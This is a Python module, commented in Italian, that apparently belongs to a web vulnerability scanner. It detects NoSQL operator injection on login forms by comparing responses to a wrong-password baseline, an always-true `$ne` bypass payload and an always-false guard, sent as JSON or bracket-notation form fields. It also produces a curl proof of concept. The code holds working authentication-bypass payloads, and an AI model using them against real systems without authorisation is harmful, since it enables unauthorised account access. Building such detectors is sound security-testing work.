"""Lane NoSQLi — operator injection in un login che costruisce una query NoSQL.

Metodo (differenziale OGGETTIVO, come il boolean-based SQLi): su un endpoint di
login che accetta un body JSON, al posto del VALORE di un campo si inietta un
OPERATORE di query stile MongoDB. Tre richieste:

  - BASELINE  — credenziali letterali sbagliate              → login negato (atteso)
  - TRUE-op   — `{"$ne": "<nonce>"}` ("diverso da un valore inesistente", quindi
                sempre vero): se il server VALUTA l'operatore, la condizione sul
                campo è sempre soddisfatta → BYPASS dell'autenticazione
  - FALSE-op  — `{"$in": []}` (insieme vuoto, quindi sempre falso) → resta negato

Se il TRUE-op differisce dalla baseline negata E il FALSE-op resta UGUALE alla
baseline, l'operatore è stato interpretato come query → NoSQL injection. Il
doppio controllo (anche il FALSE-op) chiude il falso positivo del server che va
in errore su QUALSIASI oggetto: lì TRUE e FALSE divergerebbero dalla baseline
nello stesso modo (FALSE ≠ baseline) e la lane NON segnala.

Il verdetto nasce dal confronto delle risposte reali (status + lunghezza), non
da un parere. Due transport (`send_as`):

  - `json` (default) — l'operatore vive nel BODY JSON (`{"user": {"$ne": …}}`):
    il vettore NoSQLi più comune per le API.
  - `form` — BRACKET-NOTATION form-urlencoded (`user[$ne]=…`): è così che gli
    stack Express (qs/body-parser 'extended') e PHP ricostruiscono un dict
    annidato da una chiave con parentesi, portando l'operatore nella query anche
    FUORI dal body JSON (il vettore su query-string/form, prima fuori scope).

Il metodo differenziale è identico nei due transport. ATTIVO: manda payload,
SOLO host in ALLOWLIST (via core.probe).
"""

import json
import secrets as _secrets
from urllib.parse import urlencode

from core import finding, probe, as_curl


def _sig(resp):
    """Firma confrontabile della risposta: (status, lunghezza_corpo)."""
    if "error" in resp:
        return (None, 0)
    return (resp["status"], len(resp.get("body_head", "")))


def _encode(fields, send_as):
    """Serializza i campi del login nel transport scelto, così la stessa coppia
    (headers, body) serve a MANDARE la richiesta e a generare il PoC curl.

    - `json`: corpo JSON; un valore-operatore (`{"$ne": …}`) resta un dict nel body.
    - `form`: form-urlencoded in BRACKET-NOTATION — un campo il cui valore è un
      operatore diventa `campo[$op]=val` (stile Express qs/body-parser 'extended',
      PHP), così l'operator-injection si prova anche su query-string/form.
    Ritorna (content_type, body)."""
    if send_as == "form":
        pairs = []
        for k, v in fields.items():
            if isinstance(v, dict):
                for op, val in v.items():
                    pairs.append((f"{k}[{op}]", val))   # campo[$op]=val
            else:
                pairs.append((k, v))
        return "application/x-www-form-urlencoded", urlencode(pairs)
    return "application/json", json.dumps(fields)


def _send(url, user_field, pass_field, user_val, pass_val, send_as="json", session=None):
    """Costruisce il corpo nel transport `send_as` e manda la richiesta. Ritorna
    (url, headers, body, risposta): la stessa tripla serve a mandare E a generare
    il PoC curl. `session` (Cookie/Bearer/header) raggiunge la superficie LOGGATA."""
    ct, b = _encode({user_field: user_val, pass_field: pass_val}, send_as)
    h = {"Content-Type": ct}
    return url, h, b, probe(url, "POST", h, b, session=session)


def nosqli_login(url, user_field="username", pass_field="password", user="admin",
                 send_as="json", session=None):
    """Testa un login per NoSQL operator injection. `send_as`: `json` (operatore
    nel body JSON) o `form` (bracket-notation `campo[$op]=`). Ritorna un Finding."""
    nonce = "aries_" + _secrets.token_hex(3)
    # Operatore SEMPRE-FALSO (guardia anti-FP): `$in: []` (insieme vuoto) in JSON;
    # in bracket-notation un insieme vuoto non è esprimibile → `$eq: <nonce>`
    # (uguale a un valore inesistente, quindi sempre falso), ugualmente un dict.
    false_op = {"$eq": nonce} if send_as == "form" else {"$in": []}
    # baseline: credenziali letterali sbagliate → atteso negato
    _, _, _, base = _send(url, user_field, pass_field, user, "aries_wrong_" + nonce,
                          send_as=send_as, session=session)
    # TRUE-op: $ne di un valore inesistente → sempre vero → bypass se valutato
    tu, th, tb, true = _send(url, user_field, pass_field, {"$ne": nonce}, {"$ne": nonce},
                             send_as=send_as, session=session)
    # FALSE-op: sempre falso → resta negato (= baseline)
    _, _, _, false = _send(url, user_field, pass_field, false_op, false_op,
                           send_as=send_as, session=session)

    sb, st, sf = _sig(base), _sig(true), _sig(false)
    if sb[0] is None or st[0] is None or sf[0] is None:
        err = base.get("error") or true.get("error") or false.get("error")
        return finding(f"nosqli:{pass_field}", url, "ERRORE", "info",
                       "probe fallita", str(err))

    transport = "bracket-notation (form)" if send_as == "form" else "body JSON"
    # injection: il TRUE-op bypassa (≠ baseline) E il FALSE-op resta negato (= baseline).
    # Il secondo ramo esclude il server che va in errore su qualsiasi dict (lì
    # anche il FALSE-op divergerebbe dalla baseline).
    if st != sb and sf == sb:
        return finding(
            f"nosqli:{pass_field}", url, "VULNERABILE (operator injection)", "high",
            f"operatore NoSQL ({transport}) valutato come query → bypass dell'autenticazione",
            f"baseline-negata(HTTP {sb[0]},{sb[1]}b) · sempre-vero→(HTTP {st[0]},{st[1]}b) ≠ baseline "
            f"· sempre-falso→(HTTP {sf[0]},{sf[1]}b) = baseline (il sempre-falso resta negato)",
            as_curl(tu, "POST", th, tb, session=session))
    return finding(
        f"nosqli:{pass_field}", url, "non rilevata", "ok",
        f"nessun operatore interpretato ({transport}: input trattato come dato/stringa)",
        f"baseline(HTTP {sb[0]},{sb[1]}b) · vero(HTTP {st[0]},{st[1]}b) · falso(HTTP {sf[0]},{sf[1]}b)")


def run(url, user_field="username", pass_field="password", user="admin", send_as="json", session=None):
    return [nosqli_login(url, user_field=user_field, pass_field=pass_field, user=user,
                         send_as=send_as, session=session)]
